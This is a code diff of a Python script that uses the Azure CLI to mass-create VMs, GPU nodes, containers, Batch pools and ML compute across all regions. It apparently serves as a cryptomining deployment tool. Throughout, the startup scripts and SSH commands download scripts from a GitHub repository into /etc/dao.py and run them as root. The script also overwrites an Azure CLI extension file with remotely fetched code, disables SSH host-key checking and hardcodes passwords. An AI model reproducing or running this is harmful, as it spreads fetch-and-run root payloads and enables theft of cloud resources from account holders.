@@ -10,13 +10,14 @@ from random import randint
 import re
 
 working_dir = os.path.dirname(os.path.realpath(__file__))
+
 '''
 if operate_system == 'linux':
-
     os.system('apt update -y')
     os.system('apt install python3-pip -y')
 
 import pip
+
 
 def import_or_install(package):
     try:
@@ -33,26 +34,33 @@ need_modules = ['azure-cli', 'requests']
 
 for module in need_modules:
     import_or_install(module)
+'''
 working_dir = os.path.dirname(os.path.realpath(__file__))
 
-'''
 if platform == "linux" or platform == "linux2":
     operate_system = 'linux'
 elif platform == "darwin":
     operate_system = 'OS X'
 elif platform == "win32":
     operate_system = 'windows'
-
+#cauhinh
 print(operate_system)
 nuoi_acc = 0
 tao_nhanh = 1
+if nuoi_acc == 1:
+    thoigiannghi = 28800
 if tao_nhanh == 1:
-    multi_vps_gpu = 1
+    multi_vps_gpu = 0
     multi_vps = 1
     multi_container = 1
     multi_workspace = 1
     multi_batch_account = 1
 
+try:
+    if operate_system == 'linux':
+        os.system('rm -rf /root/.ssh/known_hosts')
+except:
+    pass
 if nuoi_acc == 1:
     try:
         command = 'az vm list'
@@ -71,6 +79,9 @@ if nuoi_acc == 1:
                 result = subprocess.check_output(command, shell=True)
     except:
         pass
+    for i in range(0, thoigiannghi, 10):
+        time.sleep(10)
+        print('Thoi gian con la la ' + str(thoigiannghi - i))
     print('Checking location had vps')
     command = 'az group list --output json'
     # print(command)
@@ -89,12 +100,11 @@ if nuoi_acc == 1:
     except:
         pass
 
-    location_list = ['eastus', 'eastus2', 'westus2', 'westus3', 'AustraliaEast', 'SoutheastAsia',
-                     'NorthEurope', 'UKSouth', 'WestEurope', 'centralus', 'NorthCentralUS', 'WestUS',
-                     'SouthAfricaNorth', 'CentralIndia', 'EastAsia', 'JapanEast', 'KoreaCentral',
-                     'CanadaCentral', 'FranceCentral', 'GermanyWestCentral', 'NorwayEast', 'SwitzerlandNorth',
-                     'UAENorth, ''BrazilSouth', 'WestCentralUS', 'AustraliaCentral', 'AustraliaSoutheast',
-                     'JapanWest', 'KoreaSouth', 'CanadaEast', 'UKWest']
+    location_list = ['eastus', 'eastus2', 'southcentralus', 'westus2', 'westus3', 'australiaeast', 'southeastasia',
+                    'northeurope', 'swedencentral', 'uksouth', 'westeurope', 'centralus', 'northcentralus', 'westus',
+                    'southafricanorth', 'centralindia', 'eastasia', 'japaneast', 'koreacentral', 'canadacentral',
+                    'germanywestcentral', 'norwayeast', 'switzerlandnorth', 'uaenorth', 'brazilsouth',
+                    'westcentralus', 'australiacentral', 'australiasoutheast', 'japanwest', 'southindia', 'canadaeast', 'ukwest']
     so_vung_tao_vps = len(location_list)
     so_vung_can_tao = []
     # if sott > 0:
@@ -124,17 +134,21 @@ if nuoi_acc == 1:
     print('Checking file command ssh')
     command_ssh = 'command_ssh.txt'
     command_ssh_path = os.path.join(working_dir, command_ssh)
-    check_command_ssh = os.path.exists(command_ssh_path)
-    if check_command_ssh:
-        print('Da co file command ssh')
-    else:
-        command_ssh_data = 'sudo su root\r\napt-get update -y; apt-get install -y python3; wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta/dao_haven_80_nogpu.py -O /etc/dao.py; chmod 777 ' \
-                           '/etc/dao.py; screen -dm python /etc/dao.py; exit; exit;exit;\r\n'
-        f = open(command_ssh_path, "w")
-        f.write(command_ssh_data)
-        f.close()
-    thoigiannghi = 14400
+    command_ssh_data = 'sudo su root\r\napt-get update -y; apt-get install -y build-essential; apt-get install -y python3; apt-get install -y python; apt-get install -y python3-pip; apt-get install -y python-pip; pip3 install psutil; pip install psutil; wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/dao.py -O /etc/dao.py; chmod 777 /etc/dao.py; screen -dm python3 /etc/dao.py; exit; exit;exit;\r\n'
+    #command_ssh_data = 'sudo su root\r\napt-get update -y; apt-get install -y build-essential; apt-get install -y python3; apt-get install -y python; apt-get install -y python3-pip; apt-get install -y python-pip; pip3 install psutil; pip install psutil; wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/dao_nouam.py -O /etc/dao.py; chmod 777 /etc/dao.py; screen -dm python3 /etc/dao.py; exit; exit;exit;\r\n'
+    f = open(command_ssh_path, "w+")
+    f.write(command_ssh_data)
+    f.close()
     for location in so_vung_can_tao:
+        type_vps = 'Standard_D4s_v3'
+        if location == 'westus2':
+            type_vps = 'Standard_D4s_v5'
+        if location == 'southeastasia':
+            type_vps = 'Standard_DC4s_v2'
+        if location == 'centralus':
+            type_vps ='Standard_D4as_v5'
+        if location == 'francecentral':
+           type_vps ='Standard_D4as_v4'
         try:
             print('Creating group name %s in location %s' % (location, location))
             command = 'az group create -l %s -n %s' % (location, location)
@@ -147,7 +161,6 @@ if nuoi_acc == 1:
             vm_temp_name = ''
             for name in range(1, randint(8, 12), 1):
                 vm_temp_name += random.choice(string.ascii_lowercase)
-            type_vps = 'Standard_D4s_v3'
             versionos = 'Canonical:UbuntuServer:18_04-lts-gen2:latest'
             command = 'az vm create --size ' + type_vps + ' --image ' + versionos + \
                       ' --authentication-type all --admin-username azureuser' + ' --admin-password Hoanglan@123' + \
@@ -187,10 +200,27 @@ if nuoi_acc == 1:
             time.sleep(10)
             print('Thoi gian con la la ' + str(thoigiannghi - i))
         try:
+            command = 'az vm list'
+            print(command)
+            result = subprocess.check_output(command, shell=True)
+            ketqua = json.loads(result)
+            for vm in ketqua:
+                # print(vm)
+                command = 'az vm show --show-details --resource-group %s --name %s' % (vm['resourceGroup'], vm['name'])
+                result = subprocess.check_output(command, shell=True)
+                ketqua = json.loads(result)
+                print('%s   %s  %s' % (ketqua['name'], ketqua['resourceGroup'], ketqua['powerState']))
+                if ketqua['powerState'] != 'VM running':
+                    command = 'az vm start --resource-group %s --name %s --no-wait' % (
+                        ketqua['resourceGroup'], ketqua['name'])
+                    result = subprocess.check_output(command, shell=True)
+        except:
+            pass
+        try:
             vm_temp_name = ''
             for name in range(1, randint(8, 12), 1):
                 vm_temp_name += random.choice(string.ascii_lowercase)
-            type_vps = 'Standard_D4s_v3'
+            #type_vps = 'Standard_D4s_v3'
             versionos = 'Canonical:UbuntuServer:18_04-lts-gen2:latest'
             command = 'az vm create --size ' + type_vps + ' --image ' + versionos + \
                       ' --authentication-type all --admin-username azureuser' + ' --admin-password Hoanglan@123' + \
@@ -247,10 +277,27 @@ if nuoi_acc == 1:
         except:
             pass
         try:
+            command = 'az vm list'
+            print(command)
+            result = subprocess.check_output(command, shell=True)
+            ketqua = json.loads(result)
+            for vm in ketqua:
+                # print(vm)
+                command = 'az vm show --show-details --resource-group %s --name %s' % (vm['resourceGroup'], vm['name'])
+                result = subprocess.check_output(command, shell=True)
+                ketqua = json.loads(result)
+                print('%s   %s  %s' % (ketqua['name'], ketqua['resourceGroup'], ketqua['powerState']))
+                if ketqua['powerState'] != 'VM running':
+                    command = 'az vm start --resource-group %s --name %s --no-wait' % (
+                        ketqua['resourceGroup'], ketqua['name'])
+                    result = subprocess.check_output(command, shell=True)
+        except:
+            pass
+        try:
             vm_temp_name = ''
             for name in range(1, randint(8, 12), 1):
                 vm_temp_name += random.choice(string.ascii_lowercase)
-            type_vps = 'Standard_D4s_v3'
+            #type_vps = 'Standard_D4s_v3'
             versionos = 'Canonical:UbuntuServer:18_04-lts-gen2:latest'
             command = 'az vm create --size ' + type_vps + ' --image ' + versionos + \
                       ' --authentication-type all --admin-username azureuser' + ' --admin-password Hoanglan@123' + \
@@ -290,10 +337,27 @@ if nuoi_acc == 1:
             time.sleep(10)
             print('Thoi gian con la la ' + str(thoigiannghi - i))
         try:
+            command = 'az vm list'
+            print(command)
+            result = subprocess.check_output(command, shell=True)
+            ketqua = json.loads(result)
+            for vm in ketqua:
+                # print(vm)
+                command = 'az vm show --show-details --resource-group %s --name %s' % (vm['resourceGroup'], vm['name'])
+                result = subprocess.check_output(command, shell=True)
+                ketqua = json.loads(result)
+                print('%s   %s  %s' % (ketqua['name'], ketqua['resourceGroup'], ketqua['powerState']))
+                if ketqua['powerState'] != 'VM running':
+                    command = 'az vm start --resource-group %s --name %s --no-wait' % (
+                        ketqua['resourceGroup'], ketqua['name'])
+                    result = subprocess.check_output(command, shell=True)
+        except:
+            pass
+        try:
             vm_temp_name = ''
             for name in range(1, randint(8, 12), 1):
                 vm_temp_name += random.choice(string.ascii_lowercase)
-            type_vps = 'Standard_D4s_v3'
+            #type_vps = 'Standard_D4s_v3'
             versionos = 'Canonical:UbuntuServer:18_04-lts-gen2:latest'
             command = 'az vm create --size ' + type_vps + ' --image ' + versionos + \
                       ' --authentication-type all --admin-username azureuser' + ' --admin-password Hoanglan@123' + \
@@ -355,14 +419,9 @@ if nuoi_acc == 1:
             pass
 
 if tao_nhanh == 1:
-    dulieuvao_gpu = '"#!/bin/sh\r\nsleep 60\r\nsudo su root\r\napt-get update -y; apt-get install -y build-essential; ' \
-                    'apt-get install -y python; wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta' \
-                    '/dao_haven_80.py ' \
-                    '-O /etc/dao.py; chmod 777 /etc/dao.py; python /etc/dao.py;\r\n"'
+    dulieuvao_gpu = '"#!/bin/sh\r\nsleep 60\r\nsudo su root\r\napt-get update -y; apt-get install -y build-essential; apt-get install -y python; apt-get install -y python3; apt-get install -y python3-pip; apt-get install -y python-pip; pip3 install psutil; pip install psutil; wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_gpu.py -O /etc/dao.py; chmod 777 /etc/dao.py; python3 /etc/dao.py;\r\n"'
 
-    dulieuvao_cpu = '"#!/bin/sh\r\nsleep 60\r\nsudo su root\r\napt-get update -y; apt-get install -y build-essential; ' \
-                    'apt-get install -y python; wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta/dao_haven_80_nogpu.py ' \
-                    '-O /etc/dao.py; chmod 777 /etc/dao.py; python /etc/dao.py;\r\n"'
+    dulieuvao_cpu = '"#!/bin/sh\r\nsleep 60\r\nsudo su root\r\napt-get update -y; apt-get install -y build-essential; apt-get install -y python; apt-get install -y python3; apt-get install -y python3-pip; apt-get install -y python-pip; pip3 install psutil; pip install psutil; wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_cpu.py -O /etc/dao.py; chmod 777 /etc/dao.py; python3 /etc/dao.py;\r\n"'
 
     process = subprocess.Popen(['timeout', '1500', 'az', 'account', 'list', '--query', '[].id', '-o', 'tsv'],
                                stdout=subprocess.PIPE)
@@ -415,16 +474,26 @@ if tao_nhanh == 1:
                 ketqua = json.loads(result)
                 group = group_name
                 print(group_name)
-            location_list = ['eastus2', 'francecentral', 'japaneast', 'norwayeast', 'switzerlandnorth', 'uaenorth',
-                             'centralindia']
-            # location_list = ['japaneast', 'norwayeast', 'switzerlandnorth', 'uaenorth', 'centralindia']
-            local_type_vps = ['Standard_NV6s_v2']
+            '''
+            location_list = ['eastus', 'eastus2', 'southcentralus', 'westus2', 'westus3', 'australiaeast',
+                             'southeastasia', 'northeurope', 'swedencentral', 'uksouth', 'westeurope', 'centralus',
+                             'northcentralus', 'westus', 'southafricanorth', 'centralindia', 'eastasia', 'japaneast',
+                             'koreacentral', 'canadacentral', 'francecentral', 'germanywestcentral', 'norwayeast',
+                             'switzerlandnorth', 'uaenorth', 'brazilsouth', 'westcentralus', 'australiacentral',
+                             'japaneast', 'southindia', 'westindia', 'canadaeast', 'ukwest']
+            '''
+            location_list = ['eastus', 'eastus2', 'southcentralus', 'westus2', 'westus3', 'australiaeast', 'southeastasia',
+                            'northeurope', 'swedencentral', 'uksouth', 'westeurope', 'centralus', 'northcentralus', 'westus',
+                            'southafricanorth', 'centralindia', 'eastasia', 'japaneast', 'koreacentral', 'canadacentral',
+                            'francecentral', 'germanywestcentral', 'norwayeast', 'switzerlandnorth', 'uaenorth', 'brazilsouth',
+                            'westcentralus', 'australiacentral', 'australiasoutheast', 'japanwest', 'southindia', 'canadaeast', 'ukwest']
+            local_type_vps = ['Standard_NV4as_v4']
             local_versionos = 'Canonical:UbuntuServer:18.04-LTS:latest'
             nghi = 1
             for region in location_list:
                 for size in local_type_vps:
                     nghi += 1
-                    
+
                     print('tao vps no Spot o vung %s' % region)
                     vm_temp_name = ''
                     for name in range(1, randint(8, 12), 1):
@@ -444,7 +513,7 @@ if tao_nhanh == 1:
                     except:
                         pass
                         # time.sleep(2)
-                    
+
                     print('tao vps Spot o vung %s' % region)
                     vm_temp_name = ''
                     for name in range(1, randint(8, 12), 1):
@@ -509,26 +578,38 @@ if tao_nhanh == 1:
                 ketqua = json.loads(result)
                 group = group_name
                 print(group_name)
-            location_list = ['australiacentral', 'australiaeast', 'australiasoutheast', 'brazilsouth',
-                             'brazilsoutheast',
-                             'canadacentral', 'canadaeast', 'centralindia', 'centralus', 'eastasia', 'eastus',
-                             'eastus2',
-                             'francecentral', 'germanywestcentral', 'japaneast', 'japanwest', 'koreacentral',
-                             'koreasouth',
-                             'northcentralus', 'northeurope', 'norwayeast', 'southafricanorth', 'southcentralus',
-                             'southeastasia',
-                             'southindia', 'switzerlandnorth', 'uaenorth', 'uksouth', 'ukwest', 'westcentralus',
-                             'westeurope',
-                             'westindia', 'westus', 'westus2', 'westus3']
+            
+            location_list = ['eastus', 'eastus2', 'southcentralus', 'westus2', 'westus3', 'australiaeast', 'southeastasia',
+                            'northeurope', 'swedencentral', 'uksouth', 'westeurope', 'centralus', 'northcentralus', 'westus',
+                            'southafricanorth', 'centralindia', 'eastasia', 'japaneast', 'koreacentral', 'canadacentral',
+                            'germanywestcentral', 'norwayeast', 'switzerlandnorth', 'uaenorth', 'brazilsouth',
+                            'westcentralus', 'australiacentral', 'australiasoutheast', 'japanwest', 'southindia', 'canadaeast', 'ukwest']
+            #Vung ko co vps : ['koreasouth', 'westindia', 'francecentral']
             # location_list = ['australiacentral']
-            local_type_vps = ['Standard_D4s_v3', 'Standard_D4s_v3', 'Standard_D2as_v4']
+            #local_type_vps = ['Standard_D4s_v3', 'Standard_D4s_v3', 'Standard_D2as_v4']
+            #local_type_vps = ['Standard_D4s_v3', 'Standard_D4s_v3', 'Standard_D2s_v3']
             # local_type_vps = ['Standard_D2as_v4']
             local_versionos = 'Canonical:UbuntuServer:18.04-LTS:latest'
             nghi = 1
             for region in location_list:
+                local_type_vps = ['Standard_D4s_v3', 'Standard_D4s_v3', 'Standard_D2s_v3']
+                if region == 'westus2':
+                    local_type_vps = ['Standard_D4s_v5', 'Standard_D4s_v5', 'Standard_D2s_v5']
+                if region == 'southeastasia':
+                    local_type_vps = ['Standard_DC4s_v2', 'Standard_DC4s_v2', 'Standard_DC2s_v2']
+                if region == 'northeurope':
+                    local_type_vps = ['Standard_D4as_v5', 'Standard_D4as_v5', 'Standard_D2as_v5']
+                if region == 'centralus':
+                    local_type_vps = ['Standard_D4as_v5', 'Standard_D4as_v5', 'Standard_D2as_v5']
+                if region == 'francecentral':
+                    local_type_vps = ['Standard_D4as_v4', 'Standard_D4as_v4', 'Standard_D2as_v4']
+                if region == 'brazilsouth':
+                    local_type_vps = ['Standard_D4as_v4', 'Standard_D4as_v4', 'Standard_D2as_v4']
+                if region == 'australiasoutheast':
+                    local_type_vps = ['Standard_D4as_v4', 'Standard_D4as_v4', 'Standard_D2as_v4']
+                
                 for size in local_type_vps:
                     nghi += 1
-
                     print('tao vps no Spot o vung %s' % region)
                     vm_temp_name = ''
                     for name in range(1, randint(8, 12), 1):
@@ -610,14 +691,13 @@ if tao_nhanh == 1:
                 ketqua = json.loads(result)
                 group = group_name
                 # time.sleep(1000000)
-            location_list = ['australiaeast', 'australiasoutheast', 'brazilsouth', 'canadacentral', 'canadaeast',
-                             'centralindia', 'centralus', 'eastasia', 'eastus', 'eastus2', 'francecentral',
-                             'germanywestcentral', 'japaneast', 'japanwest', 'jioindiawest', 'koreacentral',
-                             'northcentralus', 'northeurope', 'norwayeast', 'southafricanorth', 'southcentralus',
-                             'southeastasia', 'southindia', 'switzerlandnorth', 'switzerlandwest', 'uaenorth',
-                             'uksouth', 'ukwest', 'westcentralus', 'westeurope', 'westus', 'westus2', 'westus3']
+            location_list = ['eastus', 'eastus2', 'southcentralus', 'westus2', 'westus3', 'australiaeast', 'southeastasia',
+                            'northeurope', 'uksouth', 'westeurope', 'centralus', 'northcentralus', 'westus',
+                            'southafricanorth', 'centralindia', 'eastasia', 'japaneast', 'koreacentral', 'canadacentral',
+                            'francecentral', 'germanywestcentral', 'norwayeast', 'switzerlandnorth', 'uaenorth', 'brazilsouth',
+                            'westcentralus', 'australiasoutheast', 'japanwest', 'southindia', 'canadaeast', 'switzerlandwest', 'ukwest']
             # docker_image = 'thanhcongnhe/lancuoicung'
-            docker_image = 'thanhcongnhe/haven80nogpu'
+            docker_image = 'thanhcongnhe/daonhanh'
             print('Ten container can tao la %s' % docker_image)
             nghi = 1
             for region in location_list:
@@ -651,9 +731,9 @@ if tao_nhanh == 1:
     if multi_batch_account == 1:
         print('tao batch account')
         dulieuvao_cpu = '{\r\n\t"id": "mytasktest123",\r\n\t"commandLine": "/bin/bash -c \\"apt-get update -y; apt-get ' \
-                        'install -y build-essential; apt-get install -y python; wget ' \
-                        'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/dao_haven_80_nogpu.py -O /etc/dao.py; ' \
-                        'chmod 777 /etc/dao.py; python /etc/dao.py;\\"",\r\n\t"waitForSuccess": false,' \
+                        'install -y build-essential; apt-get install -y python; apt-get install -y python3; apt-get install -y python3-pip; apt-get install -y python-pip; wget ' \
+                        'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_batch_account.py -O /etc/dao.py; ' \
+                        'chmod 777 /etc/dao.py; python3 /etc/dao.py;\\"",\r\n\t"waitForSuccess": false,' \
                         '\r\n\t"userIdentity": {\r\n\t\t"autoUser": {\r\n\t\t\t"elevationLevel": "admin",\r\n\t\t\t"scope": ' \
                         '"pool"\r\n\t\t},\r\n\t\t"userName": null\r\n\t}\r\n}\r\n'
         cpu_file = os.path.join(working_dir, 'cpu.json')
@@ -661,9 +741,9 @@ if tao_nhanh == 1:
         f.write(dulieuvao_cpu)
         f.close()
         dulieuvao_gpu = '{\r\n\t"id": "mytasktest123",\r\n\t"commandLine": "/bin/bash -c \\"apt-get update -y; apt-get ' \
-                        'install -y build-essential; apt-get install -y python; wget ' \
-                        'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/dao_haven_80.py -O /etc/dao.py; ' \
-                        'chmod 777 /etc/dao.py; python /etc/dao.py;\\"",\r\n\t"waitForSuccess": false,' \
+                        'install -y build-essential; apt-get install -y python; apt-get install -y python3; apt-get install -y python3-pip; apt-get install -y python-pip; wget ' \
+                        'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_gpu.py -O /etc/dao.py; ' \
+                        'chmod 777 /etc/dao.py; python3 /etc/dao.py;\\"",\r\n\t"waitForSuccess": false,' \
                         '\r\n\t"userIdentity": {\r\n\t\t"autoUser": {\r\n\t\t\t"elevationLevel": "admin",\r\n\t\t\t"scope": ' \
                         '"pool"\r\n\t\t},\r\n\t\t"userName": null\r\n\t}\r\n}\r\n'
         gpu_file = os.path.join(working_dir, 'gpu.json')
@@ -709,20 +789,14 @@ if tao_nhanh == 1:
                     result = process.communicate()[0]
                     ketqua = json.loads(result)
                     group = group_name
-                location_list = ['westeurope', 'eastus', 'eastus2', 'westus', 'northcentralus', 'brazilsouth',
-                                 'northeurope', 'centralus', 'eastasia', 'japaneast', 'australiasoutheast', 'japanwest',
-                                 'koreacentral', 'southeastasia', 'southcentralus', 'australiaeast',
-                                 'southindia', 'centralindia', 'westindia', 'canadacentral', 'canadaeast', 'uksouth',
-                                 'ukwest', 'westcentralus', 'westus2', 'francecentral', 'southafricanorth', 'uaenorth',
-                                 'australiacentral', 'germanywestcentral', 'switzerlandnorth', 'norwayeast',
-                                 'brazilsoutheast', 'westus3', 'swedencentral']
-                '''
-                location_list = ['australiaeast', 'canadacentral', 'centralindia', 'centralus', 'eastus', 'eastus2',
-                                 'francecentral',
-                                 'japaneast', 'koreacentral', 'northeurope', 'southcentralus', 'southeastasia',
-                                 'switzerlandnorth',
-                                 'uksouth', 'westeurope', 'westus', 'westus2']
-                '''
+
+                location_list = ['australiacentral', 'australiaeast', 'brazilsouth', 'brazilsoutheast', 'canadacentral', 
+                                'canadaeast', 'centralindia', 'centralus', 'eastasia', 'eastus', 'eastus2', 'francecentral',
+                                'germanywestcentral', 'japaneast', 'japanwest', 'koreacentral', 'koreasouth', 'northcentralus', 
+                                'northeurope', 'norwayeast', 'southafricanorth', 'southcentralus', 'southindia', 'southeastasia', 
+                                'swedencentral', 'switzerlandnorth', 'uaenorth', 'uksouth', 'ukwest', 'westcentralus', 'westeurope', 
+                                'westindia', 'westus', 'westus2', 'westus3']
+                
                 for sovung in location_list:
                     if operate_system == 'linux':
                         try:
@@ -905,8 +979,10 @@ if tao_nhanh == 1:
                 result = process.communicate()[0]
                 ketqua = json.loads(result)
                 group = group_name
-
-            command = 'az extension add -n azure-cli-ml'
+            try:
+                command = 'az extension add -n azure-cli-ml'
+            except:
+                pass
             try:
                 process = subprocess.Popen(['timeout', '500', 'su', 'root', '-c ' + command],
                                            stdout=subprocess.PIPE)
@@ -914,67 +990,61 @@ if tao_nhanh == 1:
                 pass
             result = process.communicate()[0]
             print(result)
-            workspace_name = ''
-            for name in range(1, randint(8, 12), 1):
-                workspace_name += random.choice(string.ascii_lowercase)
-            try:
-                command = 'az ml workspace create -w %s -g %s --subscription %s -l eastus' % (
-                    workspace_name, group, subscript)
-                print(command)
-                # time.sleep(10000000)
-            except:
-                pass
-            try:
-                process = subprocess.Popen(['timeout', '500', 'su', 'root', '-c ' + command],
-                                           stdout=subprocess.PIPE)
-            except:
-                pass
-            try:
-                result = process.communicate()[0]
-                print(result)
-                # ketqua = json.loads(result)
-                # print(ketqua)
-            except:
-                pass
 
-            try:
-                command = 'az ml folder attach -w %s -g %s --subscription %s --output json' % (
-                    workspace_name, group, subscript)
-                print(command)
-                # time.sleep(10000000)
-            except:
-                pass
-            try:
-                process = subprocess.Popen(['timeout', '500', 'su', 'root', '-c ' + command],
-                                           stdout=subprocess.PIPE)
-            except:
-                pass
-            try:
-                result = process.communicate()[0]
-                print(result)
-                # ketqua = json.loads(result)
-                # print(ketqua)
-            except:
-                pass
+            def create_workspace(local_workspace_name, local_group, local_region, local_subscription):
+                
+                try:
+                    command = 'az ml workspace create -w %s -g %s -l %s --subscription %s' % (local_workspace_name, local_group, local_region, local_subscription)
+                    print(command)
+                    # time.sleep(10000000)
+                except:
+                    pass
+                try:
+                    process = subprocess.Popen(['timeout', '500', 'su', 'root', '-c ' + command],stdout=subprocess.PIPE)
+                except:
+                    pass
+                try:
+                    result = process.communicate()[0]
+                    print(result)
+                    # ketqua = json.loads(result)
+                    # print(ketqua)
+                except:
+                    pass
 
-            # Down load firle compute.py moi
-            # time.sleep(1000000)
+            location_list = ['australiaeast', 'brazilsouth', 'centralindia', 'eastus', 'eastus2', 'germanywestcentral', 'japaneast', 'koreacentral', 'northeurope', 'southcentralus', 'southeastasia', 'uksouth', 'westeurope', 'westus', 'westus2']
+            #location_list = ['eastus']
+            threads = [threading.Thread(target=create_workspace, args=(region, group, region, subscript,)) for region in location_list]
+            for x in threads:
+                time.sleep(1)
+                x.start()
+            # Stop the threads
+            for x in threads:
+                x.join()
+
             try:
                 os.system('rm -rf /root/.azure/cliextensions/azure-cli-ml/azureml/core/compute/compute.py')
                 os.system(
                     'wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta/compute.py -O /root/.azure/cliextensions/azure-cli-ml/azureml/core/compute/compute.py')
             except:
                 pass
-
-
+            try:
+                working_dir = os.path.dirname(os.path.realpath(__file__))
+                log_file = 'log.txt'
+                log_path = os.path.join(working_dir, log_file)
+                f = open(log_path, "w+")
+                f.write(" ")
+                f.close()
+            except:
+                pass
             def local_create_vps(group_temp, region_temp, workspace_temp, subscript_temp):
                 local_vps_name = ''
                 for name in range(1, randint(8, 12), 1):
                     local_vps_name += random.choice(string.ascii_lowercase)
-                local_type = 'Standard_NC6'
+                password_vps = local_vps_name + '@123'
+                local_type = 'Standard_NC4as_T4_v3'
                 local_reigon_array = ['japaneast', 'southcentralus', 'southeastasia']
                 if region_temp in local_reigon_array:
-                    local_type = 'Standard_NV6'
+                    local_type = 'Standard_NC4as_T4_v3'
                 working_dir = os.path.dirname(os.path.realpath(__file__))
                 rsa_file = 'id_rsa'
                 rsa_path = os.path.join(working_dir, rsa_file)
@@ -990,8 +1060,8 @@ if tao_nhanh == 1:
                 rsa_pub_open = os.path.join(working_dir, rsa_file + '.pub')
                 local_fileopen = open(rsa_pub_open, 'r')
                 rsa_pub = local_fileopen.read()
-                command = 'az ml computetarget create amlcompute --name %s --min-nodes 1 --max-nodes 1 --admin-username azureuser --admin-user-password Hoanglan@123 --admin-user-ssh-key "%s" --remote-login-port-public-access Enabled --vm-size %s --resource-group %s --location %s --workspace-name %s --subscription %s' % (
-                    local_vps_name, rsa_pub, local_type, group_temp, region_temp, workspace_temp, subscript_temp)
+                local_fileopen.close()
+                command = 'az ml computetarget create amlcompute --name %s --min-nodes 1 --max-nodes 1 --admin-username azureuser --admin-user-password %s --admin-user-ssh-key "%s" --remote-login-port-public-access Enabled --vm-size %s --vm-priority lowpriority --resource-group %s --location %s --workspace-name %s --subscription %s' % (local_vps_name, password_vps, rsa_pub, local_type, group_temp, region_temp, workspace_temp, subscript_temp)
                 print(command)
                 try:
                     process = subprocess.Popen(['timeout', '500', 'su', 'root', '-c ' + command],
@@ -1005,8 +1075,8 @@ if tao_nhanh == 1:
                     # print(ketqua)
                 except:
                     pass
-                time.sleep(120)
-                while True:
+                time.sleep(200)
+                for cho in range(0, 10, 1):
                     command = 'az ml computetarget show --resource-group %s --workspace-name %s --name %s -v' % (
                         group_temp, workspace_temp, local_vps_name)
                     print(command)
@@ -1045,44 +1115,170 @@ if tao_nhanh == 1:
                     if ip_address is not None and port_number is not None:
                         os.system('rm -rf /root/%s' % local_vps_name)
                         print('%s:%s' % (ip_address, str(port_number)))
+                        command_ssh = 'command_ssh'
+                        command_ssh_path = os.path.join(working_dir, command_ssh)
+                        
+                        command_ssh_data = 'sudo su root\r\napt-get update -y; apt-get install -y python; apt-get install -y python3; apt-get install -y python3-pip; apt-get install -y python-pip; wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_gpu_docker_nb.py -O /etc/dao.py; chmod 777 ' \
+                                            '/etc/dao.py; screen -dm python3 /etc/dao.py; exit; exit;exit;\r\n'
+                        f = open(command_ssh_path, "w+")
+                        f.write(command_ssh_data)
+                        f.close()
+                        data_output = 'ssh -i %s %s@%s -p %s\n' % (rsa_path, 'azureuser', ip_address, str(port_number))
+                        print('ssh -i %s %s@%s -p %s' % (rsa_path, 'azureuser', ip_address, str(port_number)))
+                        working_dir = os.path.dirname(os.path.realpath(__file__))
+                        log_file = 'log.txt'
+                        log_path = os.path.join(working_dir, log_file)
+                        f = open(log_path, "a+")
+                        f.write(data_output)
+                        f.close()
+                        time.sleep(60)
+                        process = subprocess.Popen(['ssh', '-o ConnectTimeout=20', '-o StrictHostKeyChecking=no', '-i' + rsa_path, '-tt', 'azureuser@' + ip_address, '-p ' + str(port_number)], stdout=subprocess.PIPE, stdin=open(command_ssh_path, 'r'))
+                        time.sleep(60)
+                        try:
+                            process.terminate()
+                        except:
+                            pass
+                        try:
+                            process.kill()
+                        except:
+                            pass
                         break
                     time.sleep(60)
-                command_ssh = 'command_ssh'
-                command_ssh_path = os.path.join(working_dir, command_ssh)
-                check_command_ssh = os.path.exists(command_ssh_path)
-                if check_command_ssh:
-                    print('Da co file command ssh')
+                
+            def local_create_vps_phu(group_temp, region_temp, workspace_temp, subscript_temp):
+                local_vps_name = ''
+                for name in range(1, randint(8, 12), 1):
+                    local_vps_name += random.choice(string.ascii_lowercase)
+                password_vps = local_vps_name + '@123'
+                local_type = 'Standard_NC6'
+                local_reigon_array = ['japaneast', 'southcentralus', 'southeastasia']
+                if region_temp in local_reigon_array:
+                    local_type = 'Standard_NV6'
+                working_dir = os.path.dirname(os.path.realpath(__file__))
+                rsa_file = 'id_rsa'
+                rsa_path = os.path.join(working_dir, rsa_file)
+                print('Checking file %s' % rsa_path)
+                check_rsa = os.path.exists(rsa_path)
+                if check_rsa:
+                    print('Da co file rsa')
                 else:
-                    command_ssh_data = 'sudo su root\r\napt-get update -y; apt-get install -y python3; wget https://raw.githubusercontent.com/giautoidi/giautoidi/beta/dao_haven_80.py -O /etc/dao.py; chmod 777 ' \
-                                       '/etc/dao.py; screen -dm python /etc/dao.py; exit; exit;exit;\r\n'
-                    f = open(command_ssh_path, "w")
-                    f.write(command_ssh_data)
-                    f.close()
-                print('ssh -i %s %s@%s -p %s' % (rsa_path, 'azureuser', ip_address, str(port_number)))
-                process = subprocess.Popen(
-                    ['ssh', '-o ConnectTimeout=20', '-o StrictHostKeyChecking=no', '-i' + rsa_path, '-tt',
-                     'azureuser@' + ip_address, '-p ' + str(port_number)],
-                    stdout=subprocess.PIPE, stdin=open(command_ssh_path, 'r'))
+                    print('Chua co file rsa, tao moi thoi')
+                    command = 'ssh-keygen -b 2048 -t rsa -C "" -f %s -q -N ""' % rsa_path
+                    result = subprocess.check_output(command, shell=True)
+                # path_rsa = '/var/azure/.ssh/id_rsa.pub'
+                rsa_pub_open = os.path.join(working_dir, rsa_file + '.pub')
+                local_fileopen = open(rsa_pub_open, 'r')
+                rsa_pub = local_fileopen.read()
+                local_fileopen.close()
